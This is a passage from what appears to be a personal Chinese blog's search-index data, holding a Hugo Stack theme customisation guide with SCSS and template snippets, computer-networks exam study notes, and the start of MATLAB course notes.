的\u0026lt;/br\u0026gt;《汤姆·索亚历险记》了！\u0026#34;}} {{ else if ge $wowWord 16 }}{{$wowBook = \u0026#34;写完一本 曹禺 的\u0026lt;/br\u0026gt;《日出》了！\u0026#34;}} {{ else if ge $wowWord 15 }}{{$wowBook = \u0026#34;写完一本 伯内特 的\u0026lt;/br\u0026gt;《秘密花园》了！\u0026#34;}} {{ else if ge $wowWord 14 }}{{$wowBook = \u0026#34;写完一本 史铁生 的\u0026lt;/br\u0026gt;《宿命的写作》了！\u0026#34;}} {{ else if ge $wowWord 13 }}{{$wowBook = \u0026#34;写完一本 曹禺 的\u0026lt;/br\u0026gt;《雷雨》了！\u0026#34;}} {{ else if ge $wowWord 12 }}{{$wowBook = \u0026#34;写完一本 余华 的\u0026lt;/br\u0026gt;《活着》了！\u0026#34;}} {{ else if ge $wowWord 11 }}{{$wowBook = \u0026#34;写完一本 鲁迅 的\u0026lt;/br\u0026gt;《彷徨》了！\u0026#34;}} {{ else if ge $wowWord 10 }}{{$wowBook = \u0026#34;写完一本 马克·吐温 的\u0026lt;/br\u0026gt;《王子与乞丐》了！\u0026#34;}} {{ else if ge $wowWord 9 }}{{$wowBook = \u0026#34;写完一本 林海音 的\u0026lt;/br\u0026gt;《城南旧事》了！\u0026#34;}} {{ else if ge $wowWord 7 }}{{$wowBook = \u0026#34;写完一本 鲁迅 的\u0026lt;/br\u0026gt;《呐喊》了！\u0026#34;}} {{ else if ge $wowWord 5 }}{{$wowBook = \u0026#34;写完一本 埃克苏佩里 的\u0026lt;/br\u0026gt;《小王子》了！\u0026#34;}} {{ end }} tocc样式更改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 .widget--toc { // display:inline-block; font-size: 16px; #TableOfContents { overflow-x: auto; max-height: 70vh; ol, ul { list-style-type: none; margin: 0; padding: 0; } // \u0026amp; \u0026gt; ul { // padding: 0 1em; // } li { margin: 5px 10px; padding: 6px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 8px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } } 文章页面左上角引入返回按钮 在 custom.scss 中，给返回按钮添加以下样式，不然返回按钮会显示异常:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 //-------------------------------------------------- //引入左上角返回按钮 .back-home { background: var(--card-background); border-radius: var(--tag-border-radius); color: var(--card-text-color-tertiary); margin-right: 0.1rem; margin-top: 24px; display: inline-flex; align-items: center; font-size: 1.4rem; text-transform: uppercase; padding: 10px 20px 10px 15px; transition: box-shadow 0.3s ease; box-shadow: var(--shadow-l3); \u0026amp;:hover { box-shadow: var(--shadow-l2); } svg { margin-right: 5px; width: 20px; height: 20px; } span { font-weight: 500; white-space: nowrap; } } .main-container .right-sidebar { order: 2; max-width: var(--right-sidebar-max-width); /// Display right sidebar when min-width: lg @include respond(lg) { display: flex; } } main.main { order: 1; min-width: 0; max-width: 100%; flex-grow: 1; display: flex; flex-direction: column; gap: var(--section-separation); @include respond(md) { padding-top: var(--main-top-padding); } } 修改 ~\\hugo\\themes\\hugo-theme-stack\\layouts\\_default\\single.html\n写入添加以下内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 .......已省略,请自己对照...... {{ partialCached \u0026#34;footer/footer\u0026#34; . }} {{ partialCached \u0026#34;article/components/photoswipe\u0026#34; . }} {{ end }} {{ define \u0026#34;left-sidebar\u0026#34; }} {{ if (.Scratch.Get \u0026#34;TOCEnabled\u0026#34;) }} \u0026lt;div id=\u0026#34;article-toolbar\u0026#34; style=\u0026#34;position: sticky;top: 5px;z-index: 1000;\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .Site.BaseURL | relLangURL }}\u0026#34; class=\u0026#34;back-home\u0026#34;\u0026gt; {{ (resources.Get \u0026#34;icons/back.svg\u0026#34;).Content | safeHTML }} \u0026lt;span\u0026gt;{{ T \u0026#34;article.back\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; {{ else }} {{ partial \u0026#34;sidebar/left.html\u0026#34; . }} {{ end }} {{ define \u0026#34;right-sidebar\u0026#34; }} {{ if .Scratch.Get \u0026#34;hasWidget\u0026#34; }}{{ partial \u0026#34;sidebar/right.html\u0026#34; (dict \u0026#34;Context\u0026#34; . \u0026#34;Scope\u0026#34; \u0026#34;page\u0026#34;) }}{{ end}} {{ end }} 总字数统计 放置位置在layouts\\partials\\footer\\footer.html\n1 2 3 4 5 6 7 \u0026lt;section class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; {{ if and (.Site.Params.footer.since) (ne .Site.Params.footer.since (int (now.Format \u0026#34;2006\u0026#34;))) }} {{ .Site.Params.footer.since }} - {{ end }} {{ now.Format \u0026#34;2006\u0026#34; }} 小球飞鱼·\u0026lt;i class=\u0026#34;fas fa-bell\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;a id=\u0026#34;days\u0026#34;\u0026gt;0\u0026lt;/a\u0026gt;Days\u0026lt;br\u0026gt;共嘟嘟了 {{$scratch.Get \u0026#34;total\u0026#34; }}字·共 {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;post\u0026#34;) }}篇文章\u0026lt;/br\u0026gt;\u0026lt;span\u0026gt;\u0026lt;p\u0026gt; \u0026lt;/section\u0026gt; 记得要在layouts\\partials\\footer\\footer.html里写上总字数参数\n1 2 3 4 {{$scratch := newScratch}} {{ range (where .Site.Pages \u0026#34;Kind\u0026#34; \u0026#34;page\u0026#34; )}} {{$scratch.Add \u0026#34;total\u0026#34; .WordCount}} {{ end }} 建站时间 在layouts/partials/footer/footer.html中，\u0026lt;footer\u0026gt;标签内添加：\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; var s1 = \u0026#39;202x-xx-xx\u0026#39;;//设置为建站时间 s1 = new Date(s1.replace(/-/g, \u0026#34;/\u0026#34;)); s2 = new Date(); var days = s2.getTime() - s1.getTime(); var number_of_days = parseInt(days / (1000 * 60 * 60 * 24)); document.getElementById(\u0026#39;days\u0026#39;).innerHTML = number_of_days; \u0026lt;/script\u0026gt; 修改背景色 在 Open Color 选个喜欢的颜色\n1 2 # assets\\scss\\variables.scss --body-background: #f5f5f5; 添加文章前端加密功能 这是我在 Stack 主题的 issue 区翻到的有趣小功能，当然我知道前端加密没什么用啦，我加入这个功能的目的只是为了好玩，以及或许给一些 NSFW 内容做预警？\n实现方法如下\n在layouts/_default/single.html中， {{ partialCached \u0026quot;footer/footer\u0026quot; . }}一行之前添加如下代码：\n要给文章加入密码，只需要在 md 文件的开头部分插入password:xxxxxx即可。\n这个方法所形成的密码框是浏览器自带样式，没办法拥有像 loveit 等主题那样精致漂亮的弹窗，也不能单独给文章的某部分加密，不过对我来说足够了。\n鼠标指针 本地路径不生效，干脆都用外链。\nCustom Cursor 选个喜欢的样式，截图（正方形）； remove.bg 或 RemovePhotos 改成透明底； 在线图片压缩工具 尺寸压缩到 50x50； 上传到图床，复制链接到 url('') 内即可。 增添到 /themes/hugo-theme-stack/assets/scss/custom.scss\n1 2 3 4 5 6 //鼠标指针自定义，放在`static/img`内或者引用外部网站链接。 body{cursor:url(/img/pointer.cur), default;} //默认时的鼠标样式 a:hover{cursor:url(/img/link.cur), pointer;} //指向链接时的鼠标样式 button:hover {cursor: url(\u0026#39;\u0026#39;), pointer;} //代码复制按钮 input {cursor: url(\u0026#39;\u0026#39;), text;} //评论框 // 如 {cursor: url(\u0026#39;https://cdn.jsdelivr.net/gh/Tomotoes/images/blog/default.cur\u0026#39;), default; 背景图片美化 scss里面的variables.scss添加，替换url，同时还能使得背景图固定 推荐背景图的几个网站\nwallpaperhub https://w.wallhaven.cc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 :root { --body-background: url(\u0026#34;https://w.wallhaven.cc/full/3l/wallhaven-3lv8j6.jpg\u0026#34;); --body-background-size: cover; --body-background-position: center; --body-background-repeat: no-repeat; --body-background-opacity: 0.7; /* 设置透明度 */ } /* 适用于 light 模式 */ [data-scheme=\u0026#34;light\u0026#34;] { --body-background: url(\u0026#34;https://w.wallhaven.cc/full/3l/wallhaven-3lv8j6.jpg\u0026#34;); --body-background-opacity: 1.0; /* 调整 light 模式下的透明度 */ } /* 创建一个伪元素作为背景层 */ body::before { content: \u0026#34;\u0026#34;; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: var(--body-background); background-size: var(--body-background-size); background-position: var(--body-background-position); background-repeat: var(--body-background-repeat); background-attachment: fixed; /* 背景图片固定 */ opacity: var(--body-background-opacity); /* 背景透明度 */ z-index: -1; /* 确保背景层在内容后面 */ } ","date":"2024-08-25T13:58:30+08:00","permalink":"https://hack.liagu-one.top/p/hugo%E7%BE%8E%E5%8C%96/","title":"Hugo美化"},{"content":"总结 网络适配器的作用是什么，工作在哪一层 进行串行和并行传输的转换 对数据进行缓存，对接收速率进行匹配 对接收的数据进行差错检测 在计算机的操作系统上安装设备驱动程序，跟主机当中的存储器、CPU等部件进行协调 实现以太网协议，如数据的封装、发送、地址的检查、接收、有效判断、校验等等。 网络适配器工作在数据链路层和物理层。\nip地址与硬件地址的区别，为什么要用这两种不同的地址 1、长度的区别：\n物理地址即硬件地址，由48bit构成；IP地址由32bit组成，是逻辑地址。\n2、放置位置的区别：\nIP地址放IP数据报的首部，而硬件地址则放在MAC帧的首部。\n3、使用的区别:\n在网络层和网络层以上使用IP地址，数据链路层及以下使用硬件地址。\n在IP 层抽象的互连网上，我们看到的只是IP 数据报，路由器根据目的站的IP地址进行选路。在具体的物理网络的链路层，我们看到的只是MAC 帧，IP 数据报被封装在MAC帧里面。MAC 帧在不同的网络上传送时，其MAC 帧的首部是不同的。\n这种变化，在上面的IP 层上是看不到的。每个路由器都有IP 地址和硬件地址。使用IP 地址与硬件地址，尽管连接在一起的网络的硬件地址体系各不相同，但IP 层抽象的互连网却屏蔽了下层这些很复杂的细节，并使我们能够使用统一的、抽象的IP 地址进行通信。\n计算机网络法律上的国际标准和事实上的国际标准，划分哪几层 osi：应用层，表示层，会话层，运输层，网络层，数据链路层，物理层\ntcp、ip：应用层，，运输层，网际层IP，链路层\n文件传输协议FTP的工作过程是是怎么样的 11111\n2222\n某网络的掩码是，能连接多少台主机 1111\n客户服务器方式和p2p对等通信主要区别，有没有相同的地方 1111\n判断ip地址的网络类型 大题\n码分多址通信计算传输错误的 p70 2-16\nCRC计算余数的问题 地址匹配的问题 划分子网的问题 收到分组转发分组选择路由的问题 TCP报文段 2-物理层 怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。\n3-数据链路层 功能：为了向网络层提供服务，数据链路层必须使用物理层提供的服务。而物理层是以比特流进行传输的，这种比特流并不保证在数据传输过程中没有错误，接收到的位数量可能少于、等于或者多于发送的位数量。而且它们还可能有不同的值，这时数据链路层为了能实现数据有效的差错控制，就采用了一种”帧”的数据块进行传输。而要采帧格式传输，就必须有相应的帧同步技术，这就是数据链路层的”成帧”（也称为”帧同步”）功能。\n作用：将源计算机网络层来的数据可靠的传输到相邻节点的目标计算机的网络层。\n解决的问题：封装成帧，透明传输，差错检测\n数据链路和数据帧\n协议控制数据的传输\n三个基本问题分别解决什么，能不能缺少：(封装成帧，透明传输，差错检测)\n差错检测CRC\n3-2点对点协议PPP ：是用户计算机和ISP进行通信的所用的数据链路层协议\n有三部分\n一个将IP数据报封装到串行链路的方法，支持异步和同步链路，IP数据报作为PPP帧的信息部分。 一个用来建立、配置和测试数据链路连接的链路控制协议LCP，负责协商链路的参数，如认证、压缩、错误检测等。 一套网络控制协议NCP，每一个协议支持一个网络层协议，如IP、AppleTalk等，负责协商网络层的参数，如IP地址、路由协议等。 字节填充\nPPP使用0x7E（01111110)作为这个定界符，即路由器检测到某个字节为0x7E就说明上个帧传输结束，开始下个帧的传输\nPPP使用异步传输时，我们使用0x7D（01111101）作为转义符，\n把信息字段中出现的每一个0x7E字节转变为2字节序列(0x7D，0x5E)。 若信息字段中出现一个0x7D的字节(即出现了和转义字符一样的比特组合)，则把转义字符0x7D转变为2字节序列(0x7D，0x5D)。\n0比特填充：连续5个1后加0\n3-3使用广播信道的数据链路层 局域网特点：为一个单位所拥有，地理范围和站点数目有限\n局域网网络拓扑分类：星型网(中间是集线器 )，环形网，总线网，树形拓扑\n共享信道采用的技术：静态划分信道(频分多址，时分多址，码分多址)，动态媒体接入控制(多点接入)\n适配器作用：（已有）\n载波监听多点接入/碰撞检测)：\n先听后发，边听边发，冲突停发\n96比特时间，帧间最小间隔，使接受方可以检测一个帧的结束\n10Mbit/s 争用期是512比特时间，退避时间=争用期2\u0026amp;*随机数r（对于以太网，最小帧时间是确定的）\n检测空闲(512bit时间\u0026ndash;\u0026gt;争用期)后，等待96bit重发数据\n怎么实现\n使用集线器的星型拓扑：使用的还是CSMA/CD协议\n一个集线器有许多端口\n集线器工作在物理层、\n以太网的信道利用率\n以太网的mac层：48位\n以太网交换机的特点：\n1、以太网交换机的每个端口都直接与主机相连，并且一般都工作在全双工方式。 2、交换机能同时连通许多对的端口，使每一对相互通信的主机都能像独占通信媒体那样，进行无冲突地传输数据。 3、用户独占传输媒体的带宽，若一个接口到主机的带宽是10Mbit每秒，那么有10个接口的交换机的总容量是100Mbit每秒。这是交换机的最大优点。 以太网交换机的自学习功能：\n虚拟局域网\n一个vlan=一个广播域=一个网段\nvlan标识符12位vid\n连接两个交换机之间端口的链路成为汇聚链路或干线链路\n4-网络层 作用：将分组从源主机经过多个网络和多段链路传输到目的主机，可以将该任务划分为分组转发和路由选择两种重要的功能。\n解决的问题：网络层的主要任务是实现网络互连，进而实现数据包在各网络之间的传输\n4.1网络层的两个重要概念 网络层的两种服务\n网络层不提供服务质量的承诺，填空应该是数据报服务\n网络层的两个层面：（转发）数据层面，控制层面。一个是转发源主机和目的主机之间所传送的数据，另一个是传送路由信息。\n4.2网际ip 网络互连有何实际意义?进行网络互连时，有哪些共同的问题需要解决? 不可能让所有的用户都使用相同的网络。这是因为用户的需求是多种多样的，没有一种单一的网络能够满足所有用户的需求。另外，网络技术是不断发展的，网络的制造厂家也要经常推出新的网络，在竞争中求生存。因此，在市场上总有很多种不同性能、不同网络协议的网络，供不同的用户选用。因此我们面临的现实就是:在客观上，世界上有很多特性各异的网络，但这些网络又希望能够相互通信，于是网络互连的意义非常重大。\n网络互连会遇到许多问题需要解决，如:\n不同的寻址方案: 不同的最大分组长度: 不同的网络接入机制: 不同的超时控制; 不同的差错恢复方法: 不同的状态报告方法: 不同的路由选择技术: 不同的用户接入控制: 不同的服务(面向连接服务和无连接服务);不同的管理与控制方式;等等 作为中间设备，转发器、网桥、路由器和网关有何区别? 将网络互相连接起来要使用一些中间设备。根据中间设备所在的层次，有以下四种不同的中间设备: (1)物理层使用的中间设备叫作转发器 (2)数据链路层使用的中间设备叫作网桥或交换机。 (3)网络层使用的中间设备叫作路由器。 (4)在网络层以上使用的中间设备叫作网关\nip地址分类 ip由网络号和主机号组成，ABC类都是单播地址（一对一通信）D类是多播地址，一对多通信\n目前是无分类(CIDR)的ip地址 (斜线记法)，只分网络前缀和主机号\n使用其一个ip地址可能不属于任何的IP地址\n当ip最后为0可以省略，128.14.31.0/24\u0026ndash;\u0026gt;128.14.31/24\n计算机是通过子网掩码来判断网络前缀的长度，用and与运算来计算网络地址。\nip地址和mac地址 mac是数据链路层用的地址\u0026ndash;物理地址 ip地址是网络层及其以上各层所用的地址\u0026ndash;逻辑地址\nmac地址是对ip地址进行封装而成的，二者 首部都放地址。\nip地址与硬件地址的区别，为什么要用这两种不同的地址 从层次的角度看，MAC地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址(称IP地址是逻辑地址是因为I地址是用软件实现的)。\n1、长度的区别：\n物理地址即硬件地址，由48bit构成；IP地址由32bit组成，是逻辑地址。\n2、放置位置的区别：\nIP地址放IP数据报的首部，而硬件地址则放在MAC帧的首部。\n3、使用的区别:\n在网络层和网络层以上使用IP地址，数据链路层及以下使用硬件地址。\n由于全世界存在着各式各样的网络，它们使用不同的MAC地址。要使这些异构网络能够互相通信就必须进行非常复杂的 MAC地址转换工作，因此由用户或用户主机来完成这项工作几乎是不可能的事。但统一的IP地址把这个复杂问题解决了。连接到互联网的主机只需拥有统一的IP地址，它们之间的通信就像连接在同一个网络上那样简单方便。当需要把IP 地址转为MAC 地址时，调用ARP的复杂过程都由计算机软件自动进行，而用户是看不见这种调用过程的。因此，在虚拟的IP网络上用IP地址进行通信给广大的计算机用户带来很大的方便。\n地址解析协议ARP 地址解析协议 ARP:用来把一个机器(主机或路由器)的IP地址转换为相应的MAC地址(或硬件地址)。\nip数据报格式 片偏移：较长的分组的分片中间的某个分片在原来的 IP 分组中的相对位置，当前字节除以8\n标志字段中的最低位记为MF（More Fragment）：MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片中的最后一个。\n例题\n检验和计算 16位一行划分，二进制依次相加再取反算出\nip地址划分 4.3IP转发分组的过程 基于分组首部的ip地址：基于终点的转发\n二叉线索查找转发表\n依次计算，若不存在则为默认转发R4\n4.4网际控制报文协议icmp 分两种：ICMP差错报告报文和ICMP询问报文\n4.5ipv4\u0026ndash;ipv6的过渡 用到双协议栈和隧道检测技术\n4.5互联网的路由选择协议 自治系统\u0026ndash;AS\n分层次的路由选择协议有以下两个：\n**内部网关协议IGP：**自治系统内部使用的路由选择协议\n**外部网关协议EGP：**不同自治系统之间的路由选择\n内部网关协议RIP：基于向量的路由选择协议\u0026ndash;\u0026gt;利用到距离向量算法\n内部网关协议OSPF:利用了最短路径算法,最主要的特征是使用链路状态协议\n外部网关协议BGP：自治系统之间交换“可达性”信息\nRIP，OSPF和BGP路由选择协议的主要特点。 RIP是一种分布式的基于距离向量的路由选择协议，是互联网的标准协议，最大优点就是简单。RIP 协议的特点是:\n(1)仅和相邻路由器交换信息。如果两个路由器之间的通信不需要经过另一个路由器，那么这两个路由器就是相邻的。RIP协议规定，不相邻的路由器不交换信息。 (2)路由器交换的信息是当前本路由器所知道的全部信息，即自己的路由表。也就是说交换的信息是:“我到本自治系统中所有网络的(最短)距离，以及到每个网络应经过的下一跳路由器”。 (3)按固定的时间间隔交换路由信息，例如每隔 30秒。然后，路由器根据收到的路由信息更新路由表。当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。\n(4)坏消息传得慢\nOSPF最主要的特征就是使用分布式的链路状态协议。OSPF协议的特点是:\n(1)向本自治系统中的所有路由器发送信息。这里使用的方法是洪泛法，即路由器通过所有输出端口向所有相邻的路由器发送信息,而每一个相邻路由器又将此信息发往其所有的相邻路由器(但不再发送给刚刚发来信息的那个路由器)。这样，最终整个区域中所有的路由器都得到了这一信息的一个副本。 (2)发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。所谓“链路状态”,就是说明本路由器都和哪些路由器相邻,以及该链路的“度量”。OSPF 将这个“度量”用来表示费用、距离、时延、带宽，等等。这些都由网络管理人员来决定，因此较为灵活。有时为了方便，称这个度量为“代价”。 (3)只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息\nBGP是不同自治系统的路由器之间交换路由信息的协议，它采用路径向量路由选择协议BGP协议的主要特点是: (1)BGP在自治系统之间交换“可达性”信息(即“可到达”或“不可到达”)。例如，告诉相邻路由器:“到达目的网络N可经过 AS”。 (2)自治系统之间的路由选择必须考虑有关策略。 (3)BGP只能力求寻找一条能够到达目的网络且比较好的路由(不能兜圈子)，而并非要寻找一条最佳路由。\nRIP距离向量算法更新路由表 先把收到的更新信息的距离加1，下一跳改成自己。\n与原有旧的比对；\n下一跳相同，距离不同，需更新(更新成新的)（坏消息传的慢）\n不同的下一跳，选距离短的替换\n不同的下一跳，距离相同，不变\n判断用哪个路由协议更好（4-38/4-39） 选择路由按最长前缀匹配原则（4-49） 路由器输入和输出端口的处理 4.6ip多播 为了使路由器知道多播组成员的信息，需要利用网际组管理协议IGMP (Internet Group Management Protocol)。\n连接在局域网上的多播路由器还必须和互联网上的其他多播路由器协同工作，以便把多播数据报用最小代价传送给所有的组成员。这就需要使用多播路由选择协议。\n1111\n2222\n网际组管理协议IGMP\n互联网组管理协议 (IGMP) 是允许多个设备共享一个 IP 地址以便它们可以接收相同数据的协议。\n多播路由选择协议：连接在局域网上的 多播路由器 通过 多播路由选择协议 和 其它多播路由器 协同工作，把多播数据报用 最小代价 传送给所有的多播组成员\n4.8虚拟专用网vpn和网络地址转换nat\n1111\n5-运输层 解决的问题：运输层（传输层），解决的是计算机程序到计算机程序之间的通信问题，即所谓的“端”到 “端”的通信。\n5.1运输层协议概述 运输层向上面的应用层提供通信服务 通信的两端是主机中进程之间的通信，即端到端的通信 重要功能：复用和分用 网络层为主机之间的通信提供服务，而运输层在网络层的基础上，为应用进程提供通信服务 传输协议：面向连接的TCP和无连接的UDP 向高层用户屏蔽了网络的核心细节 TCP协议尽管下面的网络不可靠，但这种逻辑通信信道相当于一个全双工的可靠信道 用户数据报协议：UDP\n传输控制协议：TCP\n两个对等运输实体之间传送的数据单位叫做运输协议数据单元\u0026ndash;TPDU\n应用层所有的应用进程都可以通过运输层在传送到ip层，这就是复用。\n常见端口号\n5.2用户数据报协议UDP 概述：在ip的数据报服务上加了很少一片的功能，即复用和分用和差错检测的功能\nUDP特点：\n无连接的 使用尽最大努力交付 没有拥塞控制 支持一对一，一对多，多对一，多对多的交互通信 UDP首部开销小 首部格式及校验和计算\n首部组成：源端口，目的端口，长度，校验和\n5.3传输控制协议TCP TCP特点：\n面向连接的运输层协议 每一条TCP只有两个端点 TCP提供可靠交付 提供全双工通信 面向字节流 TCP的连接：连接的端点叫套接字或插口，被通信两端的套接字对确定\n5.4可靠的传输原理 停止等待协议 每次发送一个分组（分组必须编号）（发送后保留发送的副本以便超时重传）后停止发送，等待确认，收到确认再发送下一个分组。\n**超时重传：**超过一段时间没有收到确认，就重传前面的分组。要设置超时计时器(时间比往返时间更长)。\n确认丢失和迟到：一是丢弃重复的分组，二是收下迟到的确认什么都不做。\n以上可靠传输 协议为自动重传请求ARQ，但是效率低，可以采用连续ARQ协议和滑动窗口协议来实现高效。\n信道利用率=发送的时间/(发送的时间+传输的时间+确认分组的时间)\n连续ARQ协议 优点：容易实现，即使部分确认丢失也不必重传。 缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。\n5.5TCP报文的首部格式 首部固定部分各字段意义如下：\n1） 源端口和目的端口 各占2个字节，分别写入源端口和目的端口。\n2） 序号 占4字节。序号范围是【0，2^32 - 1】，共2^32（即4294967296）个序号。序号增加到2^32-1后，下一个序号就又回到0。也就是说，序号使用mod 2^32运算。TCP是面向字节流的。在一个TCP连接中传送的字节流中的每一个字节都按顺序编号。整个要传送的字节流的起始序号必须在连接建立时设置。首部中的序号字段值则是指的是本报文段所发送的数据的第一个字节的序号。例如，一报文段的序号是301，而接待的数据共有100字节。这就表明：本报文段的数据的第一个字节的序号是301，最后一个字节的序号是400。显然，下一个报文段（如果还有的话）的数据序号应当从401开始，即下一个报文段的序号字段值应为401。这个字段的序号也叫“报文段序号”。\n3） 确认号 占4字节，是期望收到对方下一个报文段的第一个数据字节的序号。例如，B正确收到了A发送过来的一个报文段，其序号字段值是501，而数据长度是200字节（序号501~700），这表明B正确收到了A发送的到序号700为止的数据。因此，B期望收到A的下一个数据序号是701，于是B在发送给A的确认报文段中把确认号置为701。注意，现在确认号不是501，也不是700，而是701。\n总之：若确认号为= N，则表明：到序号N-1为止的所有数据都已正确收到。 4） 数据偏移 占4位，它指出TCP报文段的数据起始处距离TCP报文段的起始处有多远。这个字段实际上是指出TCP报文段的首部长度。由于首部中还有长度不确定的选项字段，因此数据偏移字段是必要的，但应注意，“数据偏移”的单位是32位字（即以4字节的字为计算单位）。由于4位二进制数能表示的最大十进制数字是15，因此数据偏移的最大值是60字节，这也是TCP首部的最大字节（即选项长度不能超过40字节）。\n5） 保留 占6位，保留为今后使用，但目前应置为0 。\n5.6TCP可靠传输的实现（） 基于以字节为单位的滑动窗口\n也会超时重传，接收方只对按序收到的数据中的最高序号给出确认。\n5.7TCP流量控制 让发送方的发送速率不要太快，要让接收方来得及接受\n否则会减少RWND值\n5.8TCP的拥塞控制 对网络中某一资源的需求超过了网络可以提供的部分，性能就要变坏\n当输入负载到达某一数值时，网络的吞吐量反而随着负载的增大而减小，这是网络就进入了拥塞状态。 当输入负载继续增大到某一数值时，网络的吞吐量就减小为0，此时网络就无法工作了，这就是所谓的死锁。\n拥塞控制与流量控制的区别和联系（考）\nTCP（传输控制协议）具有流量控制和拥塞控制两种机制，用于确保数据可靠传输，并防止网络过载。虽然它们的目标都有助于提高网络传输效率和稳定性，但它们在原理和实现方式上有所不同。 流量控制：为了避免分组丢失，控制发送者的发送速度，使得接收者来得及接收，这就是流量控制。\n实现：由滑动窗口协议（连续ARQ协议）实现。滑动窗口协议既保证了分组无差错、有序接收，也实现了流量控制。\n**拥塞控制：**拥塞控制是作用于网络的，它是防止过多的数据注入到网络中，避免出现网络负载过大的情况；\n实现：慢开始，拥塞避免、快重传、快恢复\n5-9：TCP的运输连接原理 运输连接三个阶段：建立连接，数据传送，释放连接\nTCP的连接建立 ACK：确认号字段，1表示确认\nack:表示序号多少之前的数据已经收到，ack=x+1对tcp客户进程初始序号的确认\nrwnd表示滑动窗口\nSYN为1表示是tcp连接请求报文段(不能携带数据，但消耗一个序号)\nseq为x作为tcp客户进程所选择的初始序号，y表示服务进程\nTCP的连接释放 FIN=1表示tcp连接释放，seq表示客户进程之前传输过的序号+1（消耗一个序号）\nack表示客户进程收到的序号+1\n习题：\n最大报文段长度-MSS\n6-应用层 任务作用功能：每个应用层协议都是为了解决某一类应用问题，而问题的解决又必须通过位于不同主机中的多个应用进程之间的通信和协调工作来完成。\n域名系统dns 域名结构：顶级域，二级域，三级域。 文件传输协议FTP\n基本工作原理：FTP有两个过程一个是控制连接，一个是数据传输。 FTP协议需要两个端口，一个端口是作为控制连接端口，也就是FTP的21端口，用于发送指令给服务器以及等待服务器响应；另外一个端口用于数据传输端口，端口号为20（仅用PORT模式）。\nFTP连接需要FTP服务器和客户端两方在网络上建立通信，建立FTP连接时会有两个不同的通信通道，一个被称为命令通道，另一个为数据通道。\nTelnet协议：它为用户提供了在本地计算机上完成远程主机工作的能力。\n**万维网 (World Wide Web，WWW)：**是存储在Internet计算机中、数量巨大的文档的集合。这些文档称为页面，它是一种超文本(Hypertext)信息，可以用于描述超媒体。文本、图形、视频、音频等多媒体，也称为超媒体。\n统一资源定位符，又叫URL（Uniform Resource Locator），是专为标识Internet网上资源位置而设置的一种编址方式，我们平时所说的网页地址指的即是URL。 http://主机名/路劲\n超文本传输协议HTTP：\nhttp1.0缺点：短连接 每一个请求建立一个TCP连接，请求完成后立马断开连接。这将会导致2个问题：连接无法复用。每请求一个文档会有两倍RTT的开销。\n阻塞 连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。会导致带宽无法被充分利用，以及后续健康请求被阻塞。客户端同时发起的请求数目是固定的，如果太多就会排队阻塞。\n**SMTP发送：**连接建立，邮件发送，连接释放。\nPOP3和IMAP文件读取：\nPOP3协议允许电子邮件客户端下载服务器上的邮件，但是在客户端的操作（如移动邮件、标记已读等），不会反馈到服务器上，比如通过客户端收取了邮箱中的3封邮件并移动到其他文件夹，邮箱服务器上的这些邮件是没有同时被移动的 。\n而IMAP提供webmail 与电子邮件客户端之间的双向通信，客户端的操作都会反馈到服务器上，对邮件进行的操作，服务器上的邮件也会做相应的动作。\nMIME是什么\nMIME是一种对二进制文件进行编码以便在互联网上传输的方法，MIME用于允许在互联网上传输各种各样的文件类型\n动态主机配置协议：自动分配IP地址，使设备可以进行通信\n","date":"2024-07-01T21:12:31+08:00","permalink":"https://hack.liagu-one.top/p/9e32d85/","title":"计算机网络"},{"content":"第一章：MATLAB系统环境 最初matlab核心程序是**FORTRAN语言**编写的 matlab特点是：编程效率高 在命令行窗口执行命令，不想立即在命令行窗口输出结果，可以加**分号** matlab主要功能：数值计算，符号计算，绘图功能，程序设计语言功能，工具箱的扩展功能 命令行窗口提示用户输入命令的符号是：\u0026raquo; matlab的帮助命令是：lookfor，lookfor-all，help（没有search） matlab功能区提三个选项卡：主页，绘图，应用程序 设置matlab搜索路径有两种方法，一是path命令，二是matlab主页选项卡的环境单机设置路径按钮或者命令行窗口执行pathtool命令 matlab命令提示符后面输入并执行命令成为MATLAB的交互式命令操作 matlab的续航符：\u0026hellip;，将下面一行看成这行的逻辑继续 注释以%开头 第二章：MATLAB数据及其运算 2.1矩阵建立 2.2冒号表达式 e1初始值:e2步长:e3终止值\nlinspace(a,b,n):ab之间产生n个等长\nsub2ind（s,i,j）,ij是行列下标，s是size(A)\n[i,j]=ind2ind(s,d):d是序号\n2.3变量及其操作 2.4常用内部函数 2.5matlab运算 点乘/除法\nrem(a,b),a除b\n2.6字符串 字符串是单引号引起来的，字符数组是双引号\n书p40/41\n第三章：MATLAB矩阵处理 3.1特殊矩阵 第四章：MATLAB程序流程控制 4.2程序控制结构 输入：A=input(提示信息)；\n打印：disp(A)\n暂停：pause(暂停时间)\n字符串转数字：str2double(c)\n数值矩阵转化单元矩阵：num2cell\nifelse 1 2 3 4 5 6 7 8 9 10 